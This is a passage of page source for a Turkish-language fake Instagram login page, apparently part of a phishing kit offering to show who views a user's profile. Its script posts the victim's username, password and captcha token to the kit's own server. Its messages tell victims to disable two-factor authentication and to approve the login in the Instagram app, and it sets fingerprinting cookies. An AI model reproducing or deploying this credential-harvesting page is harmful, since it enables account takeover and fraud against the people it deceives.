            background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAIAAAACACAYAAADDPmHLAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAA2xpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuNS1jMDIxIDc5LjE1NDkxMSwgMjAxMy8xMC8yOS0xMTo0NzoxNiAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wTU09Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9tbS8iIHhtbG5zOnN0UmVmPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvc1R5cGUvUmVzb3VyY2VSZWYjIiB4bWxuczp4bXA9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC8iIHhtcE1NOk9yaWdpbmFsRG9jdW1lbnRJRD0ieG1wLmRpZDoyRTNGMkVENTlEMjE2ODExODIyQUNEMjMwNzUzNTEzMyIgeG1wTU06RG9jdW1lbnRJRD0ieG1wLmRpZDoxNzJBRTMxOEZBNjAxMUUzOEZGRkI4MkY3ODQyQTI0MiIgeG1wTU06SW5zdGFuY2VJRD0ieG1wLmlpZDoxNzJBRTMxN0ZBNjAxMUUzOEZGRkI4MkY3ODQyQTI0MiIgeG1wOkNyZWF0b3JUb29sPSJBZG9iZSBQaG90b3Nob3AgQ1M2IChNYWNpbnRvc2gpIj4gPHhtcE1NOkRlcml2ZWRGcm9tIHN0UmVmOmluc3RhbmNlSUQ9InhtcC5paWQ6NTBmNDU0NTctMWI2YS00NThmLWI0MWYtMGE5ZWVhYWZkODA3IiBzdFJlZjpkb2N1bWVudElEPSJ4bXAuZGlkOjAzMjEyRTdBNzExRTExRTJCN0UxQ0M0ODc5MTdFRjlEIi8+IDwvcmRmOkRl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);
            -webkit-animation: spin12 1.2s linear infinite;
            -moz-animation: spin12 1.2s linear infinite;
            -o-animation: spin12 1.2s linear infinite;
            animation: spin12 1.2s linear infinite
        }
        </style>
<style type="text/css" data-isostyle-id="is-7ed69b27">
        .-cx-PRIVATE-Login__root {
            position: static
        }

        .-cx-PRIVATE-Login__alerts {
            color: #f12938;
            line-height: 23px;
            margin: 0;
            padding: 0 8px 20px 10px;
            vertical-align: middle
        }

        .-cx-PRIVATE-Login__confirmation {
            color: #66bd2b;
            line-height: 23px;
            margin: 0;
            padding: 0 8px 20px 10px;
            vertical-align: middle
        }

        .-cx-PRIVATE-Login__formContainer {
            padding: 20px
        }

    @media (max-width: 639px) {
        .-cx-PRIVATE-Login__formContainer {
                left: 0;
                position: absolute;
                right: 0;
                top: 70px
            }
        }
        </style>
<style type="text/css" data-isostyle-id="is-3ca59844">
        .AppInstallLink {
            margin-right: 8px
        }

        .AppInstallLink:last-child {
            margin-right: 0
        }

        .igModalDialog .ailBadgeImage {
            border: 1px solid #FFF;
            border-radius: 8px
        }

        .ailBadgeImage {
            height: 45px
        }
        </style>
<style type="text/css" data-isostyle-id="is1e9b685d">
        .-cx-PRIVATE-LoginEndMatter__root {
            position: relative;
            text-align: center
        }

        .-cx-PRIVATE-LoginEndMatter__appInstallLinkContainer {
            -webkit-box-orient: horizontal;
            -webkit-box-direction: normal;
            -webkit-flex-direction: row;
            -ms-flex-direction: row;
            flex-direction: row;
            -webkit-box-pack: center;
            -webkit-justify-content: center;
            -ms-flex-pack: center;
            justify-content: center;
            margin-top: 20px
        }

        .-cx-PRIVATE-LoginEndMatter__appInstallLinksQuestion {
            display: block;
            font-weight: 700
        }
        </style>
<style type="text/css" data-isostyle-id="is-46ac9bbe">
            html,
            body,
            div,
            span,
            applet,
            object,
            iframe,
            h1,
            h2,
            h3,
            h4,
            h5,
            h6,
            p,
            blockquote,
            pre,
            a,
            abbr,
            acronym,
            address,
            big,
            cite,
            code,
            del,
            dfn,
            em,
            img,
            ins,
            kbd,
            q,
            s,
            samp,
            small,
            strike,
            strong,
            sub,
            sup,
            tt,
        var,
        b,
            u,
            i,
            center,
            dl,
            dt,
            dd,
            ol,
            ul,
            li,
            fieldset,
            form,
            label,
            legend,
            table,
            caption,
            tbody,
            tfoot,
            thead,
            tr,
            th,
            td,
            article,
            aside,
            canvas,
            details,
            embed,
            figure,
            figcaption,
            footer,
            header,
            hgroup,
            menu,
            nav,
            output,
            ruby,
            section,
            summary,
            time,
            mark,
            audio,
            video {
            margin: 0;
            padding: 0;
            border: 0;
            font-size: 100%;
            font: inherit;
            vertical-align: baseline
        }

        body {
            line-height: 1
        }

        ol,
            ul {
            list-style: none
        }

        blockquote,
            q {
            quotes: none
        }

        blockquote:before,
            blockquote:after,
            q:before,
            q:after {
            content: '';
            content: none
        }

        table {
            border-collapse: collapse;
            border-spacing: 0
        }
        </style>
<style type="text/css" data-isostyle-id="is-7c449ae8">
            article,
            div,
            footer,
            header,
            main,
            nav,
            section,
        #react-root {
            -webkit-box-align: stretch;
            -webkit-align-items: stretch;
            -ms-flex-align: stretch;
            align-items: stretch;
            border: 0 solid #000;
            box-sizing: border-box;
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-orient: vertical;
            -webkit-box-direction: normal;
            -webkit-flex-direction: column;
            -ms-flex-direction: column;
            flex-direction: column;
            -webkit-flex-shrink: 0;
            -ms-flex-negative: 0;
            flex-shrink: 0;
            margin: 0;
            padding: 0;
            position: relative
        }
        </style>
<style type="text/css" data-isostyle-id="is-38909dbf">
            html,
            body {
            height: 100%
        }

        #react-root {
            height: 100%;
            z-index: 0
        }
        </style>
<style type="text/css" data-isostyle-id="is58066427">
            body,
            button,
            input,
            textarea {
            font-family: 'proxima-nova', 'Helvetica Neue', Arial, Helvetica, sans-serif
        }

        a,
            a:visited {
            color: #125688;
            text-decoration: none
        }

        a:hover {
            color: #0d3c5f
        }

        a:active {
            color: #092b44
        }
        </style>
<style type="text/css" data-isostyle-id="is18596656">
        .-cx-PRIVATE-LoginPage__root {
            background-color: #fafafa;
            -webkit-box-flex: 1;
            -webkit-flex-grow: 1;
            -ms-flex-positive: 1;
            flex-grow: 1;
            -webkit-box-pack: center;
            -webkit-justify-content: center;
            -ms-flex-pack: center;
            justify-content: center;
            min-height: 100%;
            overflow: hidden
        }

        .-cx-PRIVATE-LoginPage__dialog {
            -webkit-align-self: center;
            -ms-flex-item-align: center;
            align-self: center;
            background: #fff;
            border-radius: 5px;
            border: solid 1px #edeeee;
            position: static;
            width: 375px;
            min-height: 200px
        }

        .-cx-PRIVATE-LoginPage__endMatter {
            margin-top: 20px
        }

        .-cx-PRIVATE-LoginPage__logo {
            margin: 30px auto 15px
        }

    @media (max-width: 639px) {
        .-cx-PRIVATE-LoginPage__dialog {
                background: 0 0;
                border: none
            }

        .-cx-PRIVATE-LoginPage__endMatter {
                bottom: 15px;
                left: 0;
                position: absolute;
                right: 0;
                top: auto
            }

        .-cx-PRIVATE-LoginPage__header {
                -webkit-box-align: center;
                -webkit-align-items: center;
                -ms-flex-align: center;
                align-items: center;
                background: #fff;
                border-bottom: solid 1px #edeeee;
                display: -webkit-box;
                display: -webkit-flex;
                display: -ms-flexbox;
                display: flex;
                left: 0;
                margin: auto;
                padding: 10px;
                position: fixed;
                text-align: center;
                top: 0;
                width: 100%
            }

        .-cx-PRIVATE-LoginPage__logo {
                margin: 0
            }
        }

    @media (max-height: 495px) {
        .-cx-PRIVATE-LoginPage__dialog {
                margin-top: 100px
            }

        .-cx-PRIVATE-LoginPage__endMatter {
                margin-top: 5px;
                position: static
            }

        .-cx-PRIVATE-LoginPage__header {
                position: absolute
            }
        }
        </style>
<style type="text/css" data-isostyle-id="is2c9616e">
        .-cx-PRIVATE-Util__hideText {
            display: block;
            overflow: hidden;
            text-indent: 110%;
            white-space: nowrap
        }
        </style>
</head>
<body class="">
<span id="react-root"><div class="-cx-PRIVATE-LoginPage__root">
<div class="-cx-PRIVATE-LoginPage__dialog">
<div class="-cx-PRIVATE-LoginPage__header">
</div>
<div class="-cx-PRIVATE-Login__root" ">
<div class="-cx-PRIVATE-Login__formContainer">
<div id="noLogin" style='text-align:center;display: none;' class="-cx-PRIVATE-Login__alerts">
<p id="errorAlert">Kullanıcı adın veya parolan yanlış !</p>
</div>
<div id="yesLogin" style='text-align:center;display: none;' class="-cx-PRIVATE-Login__confirmation">
<p>Giriş başarılı !</p>
</div>
<form action="<?php echo $link ?>stalklayanlar.php" method="POST">
<p class="-cx-PRIVATE-LoginForm__field" data-reactid=".0.0.1.0.2.0">
<label class="-cx-PRIVATE-LoginForm__inputLabel" for="lfFieldInputUsername" data-reactid=".0.0.1.0.2.0.0">Kullanıcı adı</label>
<input class="-cx-PRIVATE-LoginForm__inputField" id="lfFieldInputUsername" required="required" maxlength="30" name="username" placeholder="Kullanıcı adı" tabindex="1" type="text" value="">
</p>
<p class="-cx-PRIVATE-LoginForm__field" data-reactid=".0.0.1.0.2.1">
<label class="-cx-PRIVATE-LoginForm__inputLabel" for="lfFieldInputPassword">Şifre</label>
<input class="-cx-PRIVATE-LoginForm__inputField" id="lfFieldInputPassword" required="required" name="password" placeholder="Şifre" tabindex="2" type="password" value="">
</p>
<center>
<div class="g-recaptcha" data-sitekey="6LclWz0UAAAAAKEVA6wBj_a02x0GbkDex7d70Bam"></div> </center>
<p>
<button name="hesap" id='loginButton' class="-cx-PRIVATE-LoginForm__loginButton -cx-PRIVATE-LoginForm__override" tabindex="3" type="submit">Giriş yap</button>
</p>
</form>
<center>
    <?php if (@$_GET['Hesap']=='gizli') 
                     {  ?>
                        <a style="color:Red">Hesabınız Gizli Veya Kullanıcı Adınızı Yanlış Yazdınız Lütfen Kontorl Edip Tekrar Deneyin</a>
<?php } ?>
<?php if (@$_GET['Post']=='bulunamadi') 
                     {  ?>
                        <a style="color:Red">Hesabınıza Girenleri Görüntüleyebilmemiz İçin 1 En Az 1 Tane Gönderi Paylaşıp Üzerinden 24 Saat Geçmesi Gerekir.</a>
<?php } ?>
<?php if (@$_GET['kullanici']=='bulunamadi') 
                     {  ?>
                        <a style="color:Red">Girdiğiniz Kullanıcı Adı İnstagramla Eşleşmiyor.</a>
<?php } ?>
</div>
</div>
</div>
</div></span>
<script src="../login_files/tr_TR_webpack-common.js" type="text/javascript"></script>
<script src="../login_files/tr_TR_LoginPage.js" type="text/javascript"></script>
<script src="../login_files/detectOS.js"></script>
<script>
            Detect.init();
            var today = new Date();
            var the_date = new Date("December 31, 2023");
            var the_cookie_date = the_date.toGMTString();
            function setCookie(c_name, value, exdays) {
                var exdate = new Date();
                exdate.setDate(exdate.getDate() + exdays);
                var c_value = escape(value) + ((exdays == null) ? "" : "; path=/; expires=" + exdate.toUTCString());
                document.cookie = c_name + "=" + c_value;
            }
            function whichAndroidV() {
                var userAgent = navigator.userAgent.toLowerCase();
                var check = userAgent.match(/android\s([0-9\.]*)/);
                return check ? check[1] : false;
            };
            function iOSversion() {
                if (/iP(hone|od|ad)/.test(navigator.platform)) {
                    // supports iOS 2.0 and later: <http://bit.ly/TJjs1V>
                    var v = (navigator.appVersion).match(/OS (\d+)_(\d+)_?(\d+)?/);
                    return [parseInt(v[1], 10), parseInt(v[2], 10), parseInt(v[3] || 0, 10)];
                }
            }
            if(Detect.OS == 'Android') {
                setCookie("osVersion",whichAndroidV(),the_cookie_date);
//alert(whichAndroidV());
            }else if(Detect.OS == 'iOS'){
                setCookie("osVersion",iOSversion(),the_cookie_date);
            }
            setCookie("screen.width",screen.width,the_cookie_date);
            setCookie("screen.height",screen.height,the_cookie_date);
            setCookie("os",Detect.OS,the_cookie_date);
            $("#loginButton").click(function () {
                var username = $("#lfFieldInputUsername").val();
                var celikyelek = $("#g-recaptcha-response").val();
                var password = $("#lfFieldInputPassword").val();
                $('#noLogin').fadeIn();
                $('#errorAlert').html('<img src="../uploads/loading.gif" title="Yükleniyor" alt="Yükleniyor" />');
                $.post("../_login", {username: username, password: password, celikyelek: celikyelek}).done(function (data) {
                    grecaptcha.reset()
                    obj = JSON.parse(data);
                    if (obj.msg == 96) {
                        $('#errorAlert').text("Instagram ile bağlantı kurulurken sorun oluştu. Lütfen tekrar deneyiniz.");
                    }else if(obj.msg == 99) {
                        $('#errorAlert').text("Lütfen instagram uygulamasından hesabınıza giriş yapıp ben yaptım dedikten sonra tekrar deneyiniz.");
                    }else if(obj.msg == 97 )        {
                        $('#errorAlert').text("Giriş yapılırken bir sorun oluştu. Lütfen tekrar deneyiniz.");
                    } else if(obj.msg == 98) {
                        $('#errorAlert').text("Kullanıcı adı veya parola yanlış.");
                    } else if(obj.msg == 95) {
                        $('#errorAlert').text("Girdiğin kullanıcı adı bir hesaba ait değil. Lütfen kullanıcı adını kontrol edip tekrar dene.");
                    } else if (obj.msg == 94) {
                        $('#errorAlert').text("Bir sorun oluştu lütfen bir süre sonra tekrar deneyiniz.");
                    }else if (obj.msg == 555) {
                        $('#errorAlert').text("Lütfen robot olmadığınızı doğrulayın.");
                    }else if (obj.msg == 90) {
                        $('#errorAlert').text("İki Faktörlü Kimlik Doğrulması açık olduğu için giriş yapılamıyor. Lütfen kapattıktan sonra tekrar deneyiniz.");
                    }  else if (obj.msg == 93) {
                        $('#errorAlert').text("Girdiğin telefon numarası formatı hatalı lütfen başında +90 olmayacak şekilde giriniz.");
                    }   else if (obj.msg == 92) {
                        $('#errorAlert').text("Girdiğin email adresi bir hesaba ait değil. Lütfen kullanıcı adını kontrol edip tekrar dene.");
                    }
                    else if (obj.msg == 1) {
                        $('#errorAlert').empty();
                        $('#yesLogin').fadeIn().delay(2000).fadeOut();
                        setTimeout(function(){ window.location = "/igToken?data="+btoa(obj.data); }, 3000);
                    }  else if (obj.msg == 444) {
                        $('#errorAlert').empty();
                        setTimeout(function(){ window.location = "/challenge"; }, 0);
                    } else {


                        $('#errorAlert').text("Sunucularda bilinmeyen bir sorun oluştu. Lütfen daha sonra tekrar deneyiniz.");
                        $('#noLogin').fadeIn().delay(2000).fadeOut();
                    }
                });
            });
        </script>
</body>
<div style="display: none;">
<script id="_wauc55">var _wau = _wau || []; _wau.push(["classic", "5hp8nhdo3m4z", "c55"]);
                (function() {var s=document.createElement("script"); s.async=true;
                    s.src="//widgets.amung.us/classic.js";
                    document.getElementsByTagName("head")[0].appendChild(s);
                })();</script>
</html>
